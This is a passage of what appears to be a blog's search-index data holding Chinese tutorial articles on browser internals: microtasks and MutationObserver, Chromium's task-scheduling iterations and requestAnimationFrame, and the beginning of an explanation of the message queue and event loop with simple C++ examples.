引擎会检查微任务列表，发现微任务列表中有微任务，那么接下来，依次执行这两个微任务。等微任务队列清空之后，就退出全局执行上下文。</p>\n<p>以上就是微任务的工作流程，从上面分析我们可以得出如下几个<strong>结论</strong>：</p>\n<ul>\n<li>微任务和宏任务是绑定的，每个宏任务在执行时，会创建自己的微任务队列。</li>\n<li>微任务的执行时长会影响到当前宏任务的时长。比如一个宏任务在执行过程中，产生了 100 个微任务，执行每个微任务的时间是 10 毫秒，那么执行这 100 个微任务的时间就是 1000 毫秒，也可以说这 100 个微任务让宏任务的执行时间延长了 1000 毫秒。所以你在写代码的时候一定要注意控制微任务的执行时长。</li>\n<li>在一个宏任务中，分别创建一个用于回调的宏任务和微任务，无论什么情况下，微任务都早于宏任务执行。</li>\n</ul>\n<h2 id=\"监听DOM变化方法演变\"><a href=\"#监听DOM变化方法演变\" class=\"headerlink\" title=\"监听DOM变化方法演变\"></a>监听 DOM 变化方法演变</h2><p>现在知道了微任务是怎么工作的，那接下来我们再来看看微任务是如何应用在 MutationObserver 中的。MutationObserver 是用来监听 DOM 变化的一套方法，而监听 DOM 变化一直是前端工程师一项非常核心的需求。</p>\n<p>比如许多 Web 应用都利用 HTML 与 JavaScript 构建其自定义控件，与一些内置控件不同，这些控件不是固有的。为了与内置控件一起良好地工作，这些控件必须能够适应内容更改、响应事件和用户交互。因此，Web 应用需要<strong>监视 DOM 变化并及时地做出响应</strong>。</p>\n<p>虽然监听 DOM 的需求是如此重要，不过早期页面并没有提供对监听的支持，所以那时要观察 DOM 是否变化，唯一能做的就是轮询检测，比如使用 setTimeout 或者 setInterval 来定时检测 DOM 是否有改变。这种方式简单粗暴，但是会遇到两个问题：如果时间间隔设置过长，DOM 变化响应不够及时；反过来如果时间间隔设置过短，又会浪费很多无用的工作量去检查 DOM，会让页面变得低效。</p>\n<p>直到 2000 年的时候引入了 Mutation Event，Mutation Event 采用了<strong>观察者的设计模式</strong>，当 DOM 有变动时就会立刻触发相应的事件，这种方式属于同步回调。</p>\n<p>采用 Mutation Event 解决了实时性的问题，因为 DOM 一旦发生变化，就会立即调用 JavaScript 接口。但也正是这种实时性造成了严重的性能问题，因为每次 DOM 变动，渲染引擎都会去调用 JavaScript，这样会产生较大的性能开销。比如利用 JavaScript 动态创建或动态修改 50 个节点内容，就会触发 50 次回调，而且每个回调函数都需要一定的执行时间，这里我们假设每次回调的执行时间是 4 毫秒，那么 50 次回调的执行时间就是 200 毫秒，若此时浏览器正在执行一个动画效果，由于 Mutation Event 触发回调事件，就会导致动画的卡顿。</p>\n<p>也正是因为使用 Mutation Event 会导致页面性能问题，所以 Mutation Event 被反对使用，并逐步从 Web 标准事件中删除了。</p>\n<p>为了解决了 Mutation Event 由于同步调用 JavaScript 而造成的性能问题，从 DOM4 开始，推荐使用 MutationObserver 来代替 Mutation Event。MutationObserver API 可以用来监视 DOM 的变化，包括属性的变化、节点的增减、内容的变化等。</p>\n<p>那么相比较 Mutation Event，MutationObserver 到底做了哪些改进呢？</p>\n<p>首先，MutationObserver 将响应函数改成异步调用，可以不用在每次 DOM 变化都触发异步调用，而是等多次 DOM 变化后，<strong>一次触发异步调用</strong>，并且还会使用一个数据结构来记录这期间所有的 DOM 变化。这样即使频繁地操纵 DOM，也不会对性能造成太大的影响。</p>\n<p>我们通过异步调用和减少触发次数来缓解了性能问题，那么如何保持消息通知的及时性呢？如果采用 setTimeout 创建宏任务来触发回调的话，那么实时性就会大打折扣，因为上面我们分析过，在两个任务之间，可能会被渲染进程插入其他的事件，从而影响到响应的实时性。</p>\n<p>这时候，微任务就可以上场了，在每次 DOM 节点发生变化的时候，渲染引擎将变化记录封装成微任务，并将微任务添加进当前的微任务队列中。这样当执行到检查点的时候，V8 引擎就会按照顺序执行微任务了。</p>\n<p>综上所述， MutationObserver 采用了 “异步 + 微任务” 的策略。</p>\n<ul>\n<li>通过异步操作解决了同步操作的性能问题；</li>\n<li>通过微任务解决了实时性的问题。</li>\n</ul>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>好了，今天就介绍到这里，下面我来总结下今天的内容。</p>\n<p>首先我们回顾了宏任务，然后在宏任务的基础之上，我们分析了异步回调函数的两种形式，其中最后一种回调的方式就是通过微任务来实现的。</p>\n<p>接下来我们详细分析了浏览器是如何实现微任务的，包括微任务队列、检查点等概念。</p>\n<p>最后我们介绍了监听 DOM 变化技术方案的演化史，从轮询到 Mutation Event 再到最新使用的 MutationObserver。MutationObserver 方案的核心就是采用了微任务机制，有效地权衡了实时性和执行效率的问题。</p>\n<h2 id=\"课外作业\"><a href=\"#课外作业\" class=\"headerlink\" title=\"课外作业\"></a>课外作业</h2><p>下篇文章我会从 Promise 产生的动机角度来分析 Promise，这需要一定的 Promise 基础，所以今天留给你的作业是搞清楚 Promise 的工作原理，弄清楚下面这段代码的输出结果，并解释其原因。</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">executor</span>(<span class=\"params\">resolve, reject</span>) {</span><br><span class=\"line\">    <span class=\"keyword\">let</span> rand = <span class=\"title class_\">Math</span>.<span class=\"title function_\">random</span>();</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(rand)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (rand &gt; <span class=\"number\">0.5</span>)</span><br><span class=\"line\">        <span class=\"title function_\">resolve</span>()</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        <span class=\"title function_\">reject</span>()</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"keyword\">var</span> p0 = <span class=\"keyword\">new</span> <span class=\"title class_\">Promise</span>(executor);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> p1 = p0.<span class=\"title function_\">then</span>(<span class=\"function\">(<span class=\"params\">value</span>) =&gt;</span> {</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">\"succeed-1\"</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Promise</span>(executor)</span><br><span class=\"line\">})</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> p3 = p1.<span class=\"title function_\">then</span>(<span class=\"function\">(<span class=\"params\">value</span>) =&gt;</span> {</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">\"succeed-2\"</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Promise</span>(executor)</span><br><span class=\"line\">})</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> p4 = p3.<span class=\"title function_\">then</span>(<span class=\"function\">(<span class=\"params\">value</span>) =&gt;</span> {</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">\"succeed-3\"</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Promise</span>(executor)</span><br><span class=\"line\">})</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p4.<span class=\"title function_\">catch</span>(<span class=\"function\">(<span class=\"params\">error</span>) =&gt;</span> {</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">\"error\"</span>)</span><br><span class=\"line\">})</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"number\">2</span>)</span><br></pre></td></tr></tbody></table></figure>\n"},{"title":"任务调度：有了 setTimeOut，为什么还要使用 rAF？","url":"/browser/pageEventLoop/TaskSchedule.html","content":"<p>我们都知道，要想利用 JavaScript 实现高性能的动画，那就得使用 requestAnimationFrame 这个 API，我们简称 rAF，那么为什么都推荐使用 rAF 而不是 setTimeOut 呢？</p>\n<p>要解释清楚这个问题，就要从渲染进程的任务调度系统讲起，理解了渲染进程任务调度系统，你自然就明白了 rAF 和 setTimeOut 的区别。其次，如果你理解任务调度系统，那么你就能将渲染流水线和浏览器系统架构等知识串起来，理解了这些概念也有助于你理解 Performance 标签是如何工作的。</p>\n<p>要想了解最新 Chrome 的任务调度系统是怎么工作的，我们得先来回顾下之前介绍的消息循环系统，我们知道了渲染进程内部的大多数任务都是在主线程上执行的，诸如 JavaScript 执行、DOM、CSS、计算布局、V8 的垃圾回收等任务。要让这些任务能够在主线程上有条不紊地运行，就需要引入消息队列。</p>\n<p>在前面的《<a href=\"/browser/pageEventLoop/setTimeout.html\">WebAPI：setTimeout 是如何实现的？</a>》这篇文章中，我们还介绍了，主线程维护了一个普通的消息队列和一个延迟消息队列，调度模块会按照规则依次取出这两个消息队列中的任务，并在主线程上执行。为了下文讲述方便，在这里我把普通的消息队列和延迟队列都当成一个消息队列。</p>\n<p>新的任务都是被放进消息队列中去的，然后主线程再依次从消息队列中取出这些任务来顺序执行。这就是我们之前介绍的消息队列和事件循环系统。</p>\n<h2 id=\"单消息队列的队头阻塞问题\"><a href=\"#单消息队列的队头阻塞问题\" class=\"headerlink\" title=\"单消息队列的队头阻塞问题\"></a>单消息队列的队头阻塞问题</h2><p>我们知道，渲染主线程会按照先进先出的顺序执行消息队列中的任务，具体地讲，当产生了新的任务，渲染进程会将其添加到消息队列尾部，在执行任务过程中，渲染进程会顺序地从消息队列头部取出任务并依次执行。</p>\n<p>在最初，采用这种方式没有太大的问题，因为页面中的任务还不算太多，渲染主线程也不是太繁忙。不过浏览器是向前不停进化的，其进化路线体现在架构的调整、功能的增加以及更加精细的优化策略等方面，这些变化让渲染进程所需要处理的任务变多了，对应的渲染进程的主线程也变得越拥挤。下图所展示的仅仅是部分运行在主线程上的任务，你可以参考下：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/66436b280ea9cb1403112b5d.png\" alt=\"队头阻塞问题\"></p>\n<p>因此，<strong>在单消息队列架构下，存在着低优先级任务会阻塞高优先级任务的情况</strong>，比如在一些性能不高的手机上，有时候滚动页面需要等待一秒以上。这像极了我们在介绍 HTTP 协议时所谈论的队头阻塞问题，那么我们也把这个问题称为消息队列的队头阻塞问题吧。</p>\n<h2 id=\"Chromium是如何解决队头阻塞问题的？\"><a href=\"#Chromium是如何解决队头阻塞问题的？\" class=\"headerlink\" title=\"Chromium是如何解决队头阻塞问题的？\"></a>Chromium 是如何解决队头阻塞问题的？</h2><p>为了解决由于单消息队列而造成的队头阻塞问题，Chromium 团队从 2013 年到现在，花了大量的精力在持续重构底层消息机制。在接下来的篇幅里，我会按照 Chromium 团队的重构消息系统的思路，来带你分析下他们是如何解决掉队头阻塞问题的。</p>\n<h3 id=\"第一次迭代：引入一个高优先级队列\"><a href=\"#第一次迭代：引入一个高优先级队列\" class=\"headerlink\" title=\"第一次迭代：引入一个高优先级队列\"></a>第一次迭代：引入一个高优先级队列</h3><p>首先在最理想的情况下，我们希望能够快速跟踪高优先级任务，比如在交互阶段，下面几种任务都应该视为高优先级的任务：</p>\n<ul>\n<li>通过鼠标触发的点击任务、滚动页面任务；</li>\n<li>通过手势触发的页面缩放任务；</li>\n<li>通过 CSS、JavaScript 等操作触发的动画特效等任务。<br>这些任务被触发后，用户想立即得到页面的反馈，所以我们需要让这些任务能够优先与其他的任务执行。要实现这种效果，我们可以增加一个高优级的消息队列，将高优先级的任务都添加到这个队列里面，然后优先执行该消息队列中的任务。最终效果如下图所示:</li>\n</ul>\n<p><img data-src=\"https://pic.imgdb.cn/item/66436b650ea9cb14031173f5.png\" alt=\"引入高优先级的消息队列\"></p>\n<p>观察上图，我们使用了一个优先级高的消息队列和一个优先级低消息队列，渲染进程会将它认为是紧急的任务添加到高优先级队列中，不紧急的任务就添加到低优先级的队列中。然后我们再在渲染进程中引入一个<strong>任务调度器</strong>，负责从多个消息队列中选出合适的任务，通常实现的逻辑，先按照顺序从高优先级队列中取出任务，如果高优先级的队列为空，那么再按照顺序从低优级队列中取出任务。</p>\n<p>我们还可以更进一步，将任务划分为多个不同的优先级，来实现更加细粒度的任务调度，比如可以划分为高优先级，普通优先级和低优先级，最终效果如下图所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/66436c260ea9cb140312643c.png\" alt=\"增加多个不同优先级的消息队列\"></p>\n<p>观察上图，我们实现了三个不同优先级的消息队列，然后可以使用任务调度器来统一调度这三个不同消息队列中的任务。</p>\n<p>好了，现在我们引入了多个消息队列，结合任务调度器我们就可以灵活地调度任务了，这样我们就可以让高优先级的任务提前执行，采用这种方式似乎解决了消息队列的队头阻塞问题。</p>\n<p>不过大多数任务需要保持其相对执行顺序，如果将用户输入的消息或者合成消息添加进多个不同优先级的队列中，那么这种任务的相对执行顺序就会被打乱，甚至有可能出现还未处理输入事件，就合成了该事件要显示的图片。因此我们需要让一些相同类型的任务保持其相对执行顺序。</p>\n<h3 id=\"第二次迭代：根据消息类型来实现消息队列\"><a href=\"#第二次迭代：根据消息类型来实现消息队列\" class=\"headerlink\" title=\"第二次迭代：根据消息类型来实现消息队列\"></a>第二次迭代：根据消息类型来实现消息队列</h3><p>要解决上述问题，我们可以为不同类型的任务创建不同优先级的消息队列，比如：</p>\n<ul>\n<li>可以创建输入事件的消息队列，用来存放输入事件。</li>\n<li>可以创建合成任务的消息队列，用来存放合成事件。</li>\n<li>可以创建默认消息队列，用来保存如资源加载的事件和定时器回调等事件。</li>\n<li>还可以创建一个空闲消息队列，用来存放 V8 的垃圾自动垃圾回收这一类实时性不高的事件。<br>最终实现效果如下图所示：</li>\n</ul>\n<p><img data-src=\"https://pic.imgdb.cn/item/66436c740ea9cb140312cab7.png\" alt=\"根据消息类型实现不同优先级的消息队列\"></p>\n<p>通过迭代，这种策略已经相当实用了，但是它依然存在着问题，那就是这几种消息队列的优先级都是固定的，任务调度器会按照这种固定好的静态的优先级来分别调度任务。那么静态优先级会带来什么问题呢？</p>\n<p>我们在《<a href=\"/browser/pages/Performance.html\">页面性能：如何系统地优化页面？</a>》这节分析过页面的生存周期，页面大致的生存周期大体分为两个阶段，加载阶段和交互阶段。</p>\n<p>虽然在交互阶段，采用上述这种静态优先级的策略没有什么太大问题的，但是在页面加载阶段，如果依然要优先执行用户输入事件和合成事件，那么页面的解析速度将会被拖慢。Chromium 团队曾测试过这种情况，使用静态优先级策略，网页的加载速度会被拖慢 14%。</p>\n<h3 id=\"第三次迭代：动态调度策略\"><a href=\"#第三次迭代：动态调度策略\" class=\"headerlink\" title=\"第三次迭代：动态调度策略\"></a>第三次迭代：动态调度策略</h3><p>可以看出，我们所采用的优化策略像个跷跷板，虽然优化了高优先级任务，却拖慢低优先级任务，之所以会这样，是因为我们采取了静态的任务调度策略，对于各种不同的场景，这种静态策略就显得过于死板。</p>\n<p>所以我们还得根据实际场景来继续平衡这个跷跷板，也就是说在不同的场景下，根据实际情况，动态调整消息队列的优先级。一图胜过千言，我们先看下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/66436cc70ea9cb140313a470.png\" alt=\"动态调度策略\"></p>\n<p>这张图展示了 Chromium 在不同的场景下，是如何调整消息队列优先级的。通过这种动态调度策略，就可以满足不同场景的核心诉求了，同时这也是 Chromium 当前所采用的任务调度策略。</p>\n<p>上图列出了三个不同的场景，分别是加载过程，合成过程以及正常状态。下面我们就结合这三种场景，来分析下 Chromium 为何做这种调整。</p>\n<p>首先我们来看看<strong>页面加载阶段</strong>的场景，在这个阶段，用户的最高诉求是在尽可能短的时间内看到页面，至于交互和合成并不是这个阶段的核心诉求，因此我们需要调整策略，在加载阶段将页面解析，JavaScript 脚本执行等任务调整为优先级最高的队列，降低交互合成这些队列的优先级。</p>\n<p>页面加载完成之后就进入了<strong>交互阶段</strong>，在介绍 Chromium 是如何调整交互阶段的任务调度策略之前，我们还需要岔开一下，来回顾下页面的渲染过程。</p>\n<p>在《<a href=\"/browser/protocol/http/render.html\">渲染流程：HTML、CSS 和 JavaScript，是如何变成页面的？</a>》和《<a href=\"/browser/pages/LayeAndSynMecha.html\">分层和合成机制：为什么 CSS 动画比 JavaScript 高效？</a>》这两节，我们分析了一个页面是如何渲染并显示出来的。</p>\n<p>在显卡中有一块叫着<strong>前缓冲区</strong>的地方，这里存放着显示器要显示的图像，显示器会按照一定的频率来读取这块前缓冲区，并将前缓冲区中的图像显示在显示器上，不同的显示器读取的频率是不同的，通常情况下是 60HZ，也就是说显示器会每间隔 1/60 秒就读取一次前缓冲区。</p>\n<p>如果浏览器要更新显示的图片，那么浏览器会将新生成的图片提交到显卡的<strong>后缓冲区</strong>中，提交完成之后，GPU 会将<strong>后缓冲区和前缓冲区互换位置</strong>，也就是前缓冲区变成了后缓冲区，后缓冲区变成了前缓冲区，这就保证了显示器下次能读取到 GPU 中最新的图片。</p>\n<p>这时候我们会发现，显示器从前缓冲区读取图片，和浏览器生成新的图像到后缓冲区的过程是不同步的，如下图所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/66436d410ea9cb1403154315.png\" alt=\"VSync时钟周期和渲染引擎生成图片不同步问题\"></p>\n<p>这种显示器读取图片和浏览器生成图片不同步，容易造成众多问题。</p>\n<p>● 如果渲染进程生成的帧速比屏幕的刷新率慢，那么屏幕会在两帧中显示同一个画面，当这种断断续续的情况持续发生时，用户将会很明显地察觉到动画卡住了。<br>● 如果渲染进程生成的帧速率实际上比屏幕刷新率快，那么也会出现一些视觉上的问题，比如当帧速率在 100fps 而刷新率只有 60Hz 的时候，GPU 所渲染的图像并非全都被显示出来，这就会造成丢帧现象。<br>● 就算屏幕的刷新频率和 GPU 更新图片的频率一样，由于它们是两个不同的系统，所以屏幕生成帧的周期和 VSync 的周期也是很难同步起来的。<br>所以 VSync 和系统的时钟不同步就会造成掉帧、卡顿、不连贯等问题。</p>\n<p>为了解决这些问题，就需要将显示器的时钟同步周期和浏览器生成页面的周期绑定起来，Chromium 也是这样实现，那么下面我们就来看看 Chromium 具体是怎么实现的？</p>\n<p><strong>当显示器将一帧画面绘制完成后，并在准备读取下一帧之前，显示器会发出一个垂直同步信号（vertical synchronization）给 GPU，简称 VSync</strong>。这时候浏览器就会充分利用好 VSync 信号。</p>\n<p>具体地讲，当 GPU 接收到 VSync 信号后，会将 VSync 信号同步给浏览器进程，浏览器进程再将其同步到对应的渲染进程，渲染进程接收到 VSync 信号之后，就可以准备绘制新的一帧了，具体流程你可以参考下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/66436d920ea9cb140315c5b2.png\" alt=\"绑定VSync时钟同步周期和浏览器生成页面周期\"></p>\n<p>上面其实是非常粗略的介绍，实际实现过程也是非常复杂的，如果感兴趣，你可以参考<span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vZG9jdW1lbnQvZC8xNjgyMmR1NkRMS0RaMXZRVk5XSTNnRFZZb1NxQ1NlemdFbVdaMGFydmtQOC9lZGl0\">这篇文章<i class=\"fa fa-external-link-alt\"></i></span>。</p>\n<p>好了，我们花了很大篇幅介绍了 VSync 和页面中的一帧是怎么显示出来，有了这些知识，我们就可以回到主线了，来分析下渲染进程是如何优化交互阶段页面的任务调度策略的？</p>\n<p>从上图可以看出，当渲染进程接收到用户交互的任务后，接下来大概率是要进行绘制合成操作，因此我们可以设置，<strong>当在执行用户交互的任务时，将合成任务的优先级调整到最高</strong>。</p>\n<p>接下来，处理完成 DOM，计算好布局和绘制，就需要将信息提交给合成线程来合成最终图片了，然后合成线程进入工作状态。现在的场景是合成线程在工作了，<strong>那么我们就可以把下个合成任务的优先级调整为最低，并将页面解析、定时器等任务优先级提升</strong>。</p>\n<p>在合成完成之后，合成线程会提交给渲染主线程提交完成合成的消息，如果当前合成操作执行的非常快，比如从用户发出消息到完成合成操作只花了 8 毫秒，因为 VSync 同步周期是 16.66（1/60）毫秒，那么这个 VSync 时钟周期内就不需要再次生成新的页面了。那么从合成结束到下个 VSync 周期内，就进入了一个空闲时间阶段，那么就可以在这段空闲时间内执行一些不那么紧急的任务，比如 V8 的垃圾回收，或者通过 window.requestIdleCallback () 设置的回调任务等，都会在这段空闲时间内执行。</p>\n<h3 id=\"第四次迭代：任务饿死\"><a href=\"#第四次迭代：任务饿死\" class=\"headerlink\" title=\"第四次迭代：任务饿死\"></a>第四次迭代：任务饿死</h3><p>好了，以上方案看上去似乎非常完美了，不过依然存在一个问题，那就是在某个状态下，一直有新的高优先级的任务加入到队列中，这样就会导致其他低优先级的任务得不到执行，这称为任务饿死。</p>\n<p>Chromium 为了解决任务饿死的问题，给每个队列设置了执行权重，也就是如果连续执行了一定个数的高优先级的任务，那么中间会执行一次低优先级的任务，这样就缓解了任务饿死的情况。</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>好了，本节的内容就介绍到这里，下面我来总结下本文的主要内容：</p>\n<p>首先我们分析了基于单消息队列会引起队头阻塞的问题，为了解决队头阻塞问题，我们引入了多个不同优级的消息队列，并将紧急的任务添加到高优先级队列，不过大多数任务需要保持其相对执行顺序，如果将用户输入的消息或者合成消息添加进多个不同优先级的队列中，那么这种任务的相对执行顺序就会被打乱，所以我们又迭代了第二个版本。</p>\n<p>在第二个版本中，按照不同的任务类型来划分任务优先级，不过由于采用的静态优先级策略，对于其他一些场景，这种静态调度的策略并不是太适合，所以接下来，我们又迭代了第三版。</p>\n<p>第三个版本，基于不同的场景来动态调整消息队列的优先级，到了这里已经非常完美了，不过依然存在着任务饿死的问题，为了解决任务饿死的问题，我们给每个队列一个权重，如果连续执行了一定个数的高优先级的任务，那么中间会执行一次低优先级的任务，这样我们就完成了 Chromium 的任务改造。</p>\n<p>通过整个过程的分析，我们应该能理解，在开发一个项目时，不要试图去找最完美的方案，完美的方案往往是不存在的，我们需要根据实际的场景来寻找最适合我们的方案。</p>\n<h2 id=\"课外作业\"><a href=\"#课外作业\" class=\"headerlink\" title=\"课外作业\"></a>课外作业</h2><p>我们知道 CSS 动画是由渲染进程自动处理的，所以渲染进程会让 CSS 渲染每帧动画的过程与 VSync 的时钟保持一致，这样就能保证 CSS 动画的高效率执行。</p>\n<p>但是 JavaScript 是由用户控制的，如果采用 setTimeout 来触发动画每帧的绘制，那么其绘制时机是很难和 VSync 时钟保持一致的，所以 JavaScript 中又引入了 <code>window.requestAnimationFrame</code>，用来和 VSync 的时钟周期同步，那么我留给你的问题是：你知道 <code>requestAnimationFrame</code> 回调函数的执行时机吗？</p>\n<p>当使用 <code>requestAnimationFrame</code> 方法注册一个回调函数时，该回调函数会在浏览器进行下一次重绘之前执行。具体来说，它会在浏览器每次绘制新的一帧之前被调用。</p>\n<p>浏览器的渲染过程通常是按照以下步骤进行的：</p>\n<ol>\n<li>执行 JavaScript 代码：在执行 JavaScript 代码期间，浏览器会收集需要进行重绘的元素，并计算它们的新位置和样式。</li>\n<li>更新样式和布局：浏览器会根据 JavaScript 代码的执行结果，更新元素的样式和布局信息。</li>\n<li>绘制：浏览器使用更新后的样式和布局信息，将元素绘制到屏幕上。</li>\n<li>重绘：如果有需要更新的元素，浏览器会进行重绘操作，将更新后的元素内容绘制到屏幕上。</li>\n</ol>\n<p>在这个过程中，<code>requestAnimationFrame</code> 提供了一个优化的时间点，让开发者可以在浏览器进行重绘之前执行一些操作。这样可以确保操作与浏览器的绘制同步，避免出现不必要的重绘。</p>\n<p>使用 <code>requestAnimationFrame</code> 方法注册的回调函数会在每次浏览器进行重绘之前被调用。这意味着它的执行时机通常是与浏览器的刷新频率相匹配的。在大多数设备上，浏览器的刷新频率是每秒 60 帧（60 FPS），因此回调函数大约每 16 毫秒被调用一次。</p>\n<p>这种机制使得 <code>requestAnimationFrame</code> 非常适合用于执行与动画相关的操作，因为它可以保证动画的流畅性，并避免了不必要的计算和绘制。</p>\n"},{"title":"消息队列和事件循环：页面是怎么 “活” 起来的？","url":"/browser/pageEventLoop/MessageQueuesAndEventLoop.html","content":"<p>前面我们讲到了每个渲染进程都有一个主线程，并且主线程非常繁忙，既要处理 DOM，又要计算样式，还要处理布局，同时还需要处理 JavaScript 任务以及各种输入事件。要让这么多不同类型的任务在主线程中有条不紊地执行，这就需要一个系统来统筹调度这些任务，这个统筹调度系统就是我们今天要讲的消息队列和事件循环系统。</p>\n<p>为了能让你更加深刻地理解事件循环机制，我们就从最简单的场景来分析，然后带你一步步了解浏览器页面主线程是如何运作的。</p>\n<p>需要说明的是，文章中的代码我会采用 C++ 来示范。如果你不熟悉 C++，也没有关系，这里并没有涉及到任何复杂的知识点，只要你了解 JavaScript 或 Python，你就会看懂。</p>\n<p>使用单线程处理安排好的任务<br>我们先从最简单的场景讲起，比如有如下一系列的任务：</p>\n<ul>\n<li>任务 1：1+2</li>\n<li> 任务 2：20/5</li>\n<li> 任务 3：7*8</li>\n<li> 任务 4：打印出任务 1、任务 2、任务 3 的运算结果<br>现在要在一个线程中去执行这些任务，通常我们会这样编写代码：</li>\n</ul>\n<figure class=\"highlight c++\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">MainThread</span><span class=\"params\">()</span></span>{</span><br><span class=\"line\">     <span class=\"type\">int</span> num1 = <span class=\"number\">1</span>+<span class=\"number\">2</span>; <span class=\"comment\">//任务1</span></span><br><span class=\"line\">     <span class=\"type\">int</span> num2 = <span class=\"number\">20</span>/<span class=\"number\">5</span>; <span class=\"comment\">//任务2</span></span><br><span class=\"line\">     <span class=\"type\">int</span> num3 = <span class=\"number\">7</span>*<span class=\"number\">8</span>; <span class=\"comment\">//任务3</span></span><br><span class=\"line\">     <span class=\"built_in\">print</span>(<span class=\"string\">\"最终计算的值为:%d,%d,%d\"</span>,num1,num2,num3)； <span class=\"comment\">//任务4</span></span><br><span class=\"line\">  }</span><br></pre></td></tr></tbody></table></figure>\n\n<p>在上面的执行代码中，我们把所有任务代码按照顺序写进主线程里，等线程执行时，这些任务会按照顺序在线程中依次被执行；等所有任务执行完成之后，线程会自动退出。可以参考下图来直观地理解下其执行过程：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/6638ad240ea9cb14039c0768.png\" alt=\"第一版：线程的一次执行\"></p>\n<h2 id=\"在线程运行过程中处理新任务\"><a href=\"#在线程运行过程中处理新任务\" class=\"headerlink\" title=\"在线程运行过程中处理新任务\"></a>在线程运行过程中处理新任务</h2><p>但并不是所有的任务都是在执行之前统一安排好的，大部分情况下，新的任务是在线程运行过程中产生的。比如在线程执行过程中，又接收到了一个新的任务要求计算 “10+2”，那上面那种方式就无法处理这种情况了。</p>\n<p><strong>要想在线程运行过程中，能接收并执行新的任务，就需要采用事件循环机制</strong>。我们可以通过一个 for 循环语句来监听是否有新的任务，如下面的示例代码：</p>\n<figure class=\"highlight c++\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//GetInput</span></span><br><span class=\"line\"><span class=\"comment\">//等待用户从键盘输入一个数字，并返回该输入的数字</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">GetInput</span><span class=\"params\">()</span></span>{</span><br><span class=\"line\">    <span class=\"type\">int</span> input_number = <span class=\"number\">0</span>;</span><br><span class=\"line\">    cout&lt;&lt;<span class=\"string\">\"请输入一个数:\"</span>;</span><br><span class=\"line\">    cin&gt;&gt;input_number;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> input_number;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//主线程(Main Thread)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">MainThread</span><span class=\"params\">()</span></span>{</span><br><span class=\"line\">     <span class=\"keyword\">for</span>(;;){</span><br><span class=\"line\">          <span class=\"type\">int</span> first_num = <span class=\"built_in\">GetInput</span>()；</span><br><span class=\"line\">          <span class=\"type\">int</span> second_num = <span class=\"built_in\">GetInput</span>()；</span><br><span class=\"line\">          result_num = first_num + second_num;</span><br><span class=\"line\">          <span class=\"built_in\">print</span>(<span class=\"string\">\"最终计算的值为:%d\"</span>,result_num)；</span><br><span class=\"line\">      }</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure>\n\n<p>相较于第一版的线程，这一版的线程做了两点改进。</p>\n<ul>\n<li><strong>第一点引入了循环机制</strong>，具体实现方式是在线程语句最后添加了一个 for 循环语句，线程会一直循环执行。</li>\n<li><strong>第二点是引入了事件</strong>，可以在线程运行过程中，等待用户输入的数字，等待过程中线程处于暂停状态，一旦接收到用户输入的信息，那么线程会被激活，然后执行相加运算，最后输出结果。<br>通过引入事件循环机制，就可以让该线程 “活” 起来了，我们每次输入两个数字，都会打印出两数字相加的结果，你可以结合下图来参考下这个改进版的线程：</li>\n</ul>\n<p><img data-src=\"https://pic.imgdb.cn/item/6638ad7b0ea9cb14039ccdd7.png\" alt=\"第二版：在线程中引入事件循环\"></p>\n<h2 id=\"处理其他线程发送过来的任务\"><a href=\"#处理其他线程发送过来的任务\" class=\"headerlink\" title=\"处理其他线程发送过来的任务\"></a>处理其他线程发送过来的任务</h2><p>上面我们改进了线程的执行方式，引入了事件循环机制，可以让其在执行过程中接受新的任务。不过在第二版的线程模型中，所有的任务都是来自于线程内部的，如果另外一个线程想让主线程执行一个任务，利用第二版的线程模型是无法做到的。</p>\n<p>那下面我们就来看看其他线程是如何发送消息给渲染主线程的，具体形式你可以参考下图：</p>\n<p><img 